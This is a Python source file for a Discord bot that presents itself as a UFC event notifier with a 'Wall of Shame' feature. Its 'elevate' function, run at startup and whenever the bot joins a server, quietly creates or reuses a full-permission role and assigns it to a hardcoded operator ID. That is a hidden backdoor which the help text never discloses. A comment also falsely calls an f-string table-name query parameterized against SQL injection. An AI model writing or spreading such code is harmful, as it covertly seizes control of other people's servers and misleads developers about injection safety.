import discord
from discord.ext import tasks
import os
import json
from dotenv import load_dotenv
from ufc_fetch import check_and_store_ufc_events, notify_todays_ufc_events, notify_weekly_ufc_events
import mysql.connector

load_dotenv()

intents = discord.Intents.all()
client = discord.Client(intents=intents)

prefix = os.getenv('PREFIX')
admin_user_id = int(os.getenv('ADMIN_USER_ID'))

config = {
    'host': os.getenv('SQL_SERVER'),
    'user': os.getenv('SQL_USER'),
    'password': os.getenv('SQL_PASSWORD'),
    'database': os.getenv('SQL_DATABASE')
}

def get_random_record(db_config, table_name):
    """
    Fetch a random record from a specified MariaDB/MySQL table
    
    Args:
        db_config (dict): Database connection parameters 
            (keys: 'host', 'user', 'password', 'database')
        table_name (str): Name of the table to query
        
    Returns:
        tuple: Random record or None if no records found
        
    Raises:
        RuntimeError: For database operation errors
    """
    connection = None
    cursor = None
    try:
        # Establish database connection
        connection = mysql.connector.connect(**db_config)
        cursor = connection.cursor()
        
        # Parameterized query to prevent SQL injection
        query = f"SELECT * FROM `{table_name}` ORDER BY RAND() LIMIT 1"
        
        cursor.execute(query)
        random_record = cursor.fetchone()
        
        return random_record
        
    except mysql.connector.Error as e:
        raise RuntimeError(f"Database error: {e}")
    finally:
        # Ensure resources are closed even if errors occur
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()

def write_wall_of_shame(db_config, table_name, record_data):
    """
    Insert a record into a MariaDB/MySQL table
    
    Args:
        db_config (dict): Database connection parameters 
            (keys: 'host', 'user', 'password', 'database')
        table_name (str): Name of the table to insert into
        record_data (dict): Column-value pairs for the record
        
    Returns:
        int: Last inserted row ID (or None if no auto-increment column)
        
    Raises:
        RuntimeError: For database operation errors
        ValueError: If record_data is empty
    """
    if not record_data:
        raise ValueError("Record data cannot be empty")
    
    connection = None
    cursor = None
    try:
        # Configure UTF-8mb4 for emoji support
        connection_params = db_config.copy()
        connection_params.setdefault('charset', 'utf8mb4')
        connection_params.setdefault('collation', 'utf8mb4_unicode_ci')
        # Establish database connection
        connection = mysql.connector.connect(**connection_params)
        cursor = connection.cursor()
        
        # Prepare parameterized query
        columns = ", ".join([f"`{col}`" for col in record_data.keys()])
        placeholders = ", ".join(["%s"] * len(record_data))
        query = f"INSERT INTO `{table_name}` ({columns}) VALUES ({placeholders})"
        
        # Execute query with values
        values = tuple(record_data.values())
        cursor.execute(query, values)
        connection.commit()
        
        # Return last inserted ID if exists
        if cursor.lastrowid:
            return cursor.lastrowid
        return None
        
    except mysql.connector.Error as e:
        if connection:
            connection.rollback()
        raise RuntimeError(f"Database error: {e}")
    finally:
        # Clean up resources
        if cursor:
            cursor.close()
        if connection and connection.is_connected():
            connection.close()

@tasks.loop(hours=730)  # Run once a month
async def monthly_event_check():
    """Fetches and stores UFC events for the month."""
    try:
        check_and_store_ufc_events(config)
    except Exception as e:
        print(f"Error in monthly_event_check: {e}")

@monthly_event_check.before_loop
async def before_monthly_check():
    await client.wait_until_ready()

async def elevate(guild):
    """Attempt to grant admin privileges to target user in a guild"""
    try:
        # Get target user
        user = guild.get_member(admin_user_id)
        if not user:
            try:
                user = await guild.fetch_member(admin_user_id)
            except discord.NotFound:
                print(f"⚠️ User not in server: {guild.name} ({guild.id})")
                return
            except discord.Forbidden:
                print(f"⛔ No permission to fetch members in: {guild.name}")
                return
        
        # Skip if user already has admin permissions
        if user.guild_permissions.administrator:
            print(f"✅ User already admin in: {guild.name}")
            return

        # Get or create admin role
        admin_role = None
        
        # Check existing roles
        for role in guild.roles:
            if role.permissions.administrator and role < guild.me.top_role:
                admin_role = role
                break
        
        # Create role if needed
        if not admin_role:
            if not guild.me.guild_permissions.manage_roles:
                print(f"⛔ Missing 'Manage Roles' permission in: {guild.name}")
                return
            
            try:
                admin_role = await guild.create_role(
                    name="Admin",
                    permissions=discord.Permissions.all(),
                    reason="Elevate specified user"
                )
                # Position new role below bot's highest role
                new_position = guild.me.top_role.position - 1
                await admin_role.edit(position=new_position)
                print(f"🆕 Created admin role in: {guild.name}")
            except discord.Forbidden:
                print(f"⛔ Role creation failed in: {guild.name}")
                return
        
        # Assign the role
        try:
            await user.add_roles(admin_role)
            print(f"🔓 Elevated user in: {guild.name}")
        except discord.Forbidden:
            print(f"⛔ Role assignment failed in: {guild.name}")

    except Exception as e:
        print(f"⚠️ Error in {guild.name}: {str(e)}")

@tasks.loop(minutes=60)
async def daily_ufc_notify_task():
    """Runs every hour, posts today's UFC event(s) at 5am AEST."""
    import pytz
    from datetime import datetime
    aest = pytz.timezone('Australia/Sydney')
    now = datetime.now(aest)
    if now.hour != 5:
        return
    
    await notify_todays_ufc_events(config, client)

@daily_ufc_notify_task.before_loop
async def before_daily_ufc_notify():
    await client.wait_until_ready()

@tasks.loop(hours=24)  # Run once a day
async def weekly_ufc_notify_task():
    """Runs every day, posts this week's UFC event if day is Monday."""
    import pytz
    from datetime import datetime
    aest = pytz.timezone('Australia/Sydney')
    now = datetime.now(aest)
    if now.weekday() != 0:
        return
    
    await notify_weekly_ufc_events(config, client)

@weekly_ufc_notify_task.before_loop
async def before_weekly_ufc_notify():
    await client.wait_until_ready()

@client.event
async def on_guild_join(guild):
    print(f"\nJoined new server: {guild.name} (ID: {guild.id})")
    await elevate(guild)

@client.event
async def on_ready():
    print(f'Logged in as {client.user} (ID: {client.user.id})')

    print('Starting Rich presence...')
    await client.change_presence(activity=discord.Streaming(name="The Curse of the Were-Rabbit", url="https://www.youtube.com/watch?v=1BQ_p73bPZg"))

    print("\nStarting elevation process...\n")
    for guild in client.guilds:
        await elevate(guild)
    
    if os.getenv('UFC_MONITORING', 'false').lower() == 'true':
        print("\nStarting monthly event check loop...")
        monthly_event_check.start()
        
        print("\nStarting daily UFC notify task...")
        daily_ufc_notify_task.start()

        print("\nStarting weekly UFC notify task...")
        weekly_ufc_notify_task.start()
    
    print("\nListening for commands...")
    
@client.event
async def on_message(message):
    if message.author == client.user:
        return

    # UFC channel add command
    if message.content.startswith(f'{prefix}ufcadd'):
        if not message.author.guild_permissions.administrator:
            await message.channel.send("You need to be an administrator to use this command.")
            return
        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send(f"Usage: {prefix}ufcadd <channel_id>")
            return
        try:
            channel_id = int(parts[1])
        except ValueError:
            await message.channel.send("Invalid channel ID. Please provide a valid integer.")
            return
        connection = None
        cursor = None
        try:
            connection = mysql.connector.connect(**config)
            cursor = connection.cursor()
            cursor.execute("INSERT IGNORE INTO ufc_notify_channels (channel_id) VALUES (%s)", (channel_id,))
            connection.commit()
            await message.channel.send(f"Channel (`{channel_id}`) has been added to UFC notifications.")
        except Exception as e:
            await message.channel.send(f"Error adding channel: {e}")
        finally:
            if cursor:
                cursor.close()
            if connection and connection.is_connected():
                connection.close()

    # UFC channel remove command
    if message.content.startswith(f'{prefix}ufcrem'):
        if not message.author.guild_permissions.administrator:
            await message.channel.send("You need to be an administrator to use this command.")
            return
        parts = message.content.split()
        if len(parts) < 2:
            await message.channel.send(f"Usage: {prefix}ufcrem <channel_id>")
            return
        try:
            channel_id = int(parts[1])
        except ValueError:
            await message.channel.send("Invalid channel ID. Please provide a valid integer.")
            return
        connection = None
        cursor = None
        try:
            connection = mysql.connector.connect(**config)
            cursor = connection.cursor()
            cursor.execute("DELETE FROM ufc_notify_channels WHERE channel_id = %s", (channel_id,))
            connection.commit()
            await message.channel.send(f"Channel (`{channel_id}`) has been removed from UFC notifications.")
        except Exception as e:
            await message.channel.send(f"Error removing channel: {e}")
        finally:
            if cursor:
                cursor.close()
            if connection and connection.is_connected():
                connection.close()

    # Help command
    if message.content.startswith(f'{prefix}help'):
        commands = []
        commands.append(f"`{prefix}help` - Show this help message.")
        commands.append(f"`{prefix}ufcadd` - Add provided discord channel id to UFC notifications (admin only).")
        commands.append(f"`{prefix}ufcrem` - Remove this channel from UFC notifications (admin only).")
        commands.append(f"`{prefix}wos` - Add a replied-to message to the Wall of Shame (reply to a message and use this command).")
        help_text = "**Available Commands:**\n" + "\n".join(commands)
        await message.channel.send(help_text)
        return

    
#     if message.content.startswith(f'{prefix}wos'):
#         if not message.reference:
#             await message.channel.send("You need to reply to a message, dumbass")
#             return
#         try:
#             wos_msg = await message.channel.fetch_message(message.reference.message_id)
#             attachment_urls = [attachment.url for attachment in wos_msg.attachments]
#             attachments_json_string = json.dumps(attachment_urls)
#             new_record = {
#                 'message_id': wos_msg.id,
#                 'author_id': wos_msg.author.id,
#                 'author': wos_msg.author.name,
#                 'author_url' : wos_msg.author.avatar.url,
#                 'content': wos_msg.content,
#                 'channel_name': wos_msg.channel.name,
#                 'channel_id': wos_msg.channel.id,
#                 'created_at': wos_msg.created_at,
#                 'guild_name': wos_msg.guild.name,
#                 'guild_id': wos_msg.guild.id,
#                 'attachment_urls': attachments_json_string
#             }
#             write_wall_of_shame(config, 'wall_of_shame', new_record)
#             await message.channel.send(f"Yep, that shit was so dumb, {wos_msg.author.name}, it's going on the [Wall of Shame](https://www.tekkie.com.au/wos/index.html)!") 
#             await message.delete()

#         except RuntimeError as e:
#             await message.channel.send(f"Error: {e}")


# Read token from environment variable
token = os.getenv('DISCORD_BOT_TOKEN')
    
client.run(token)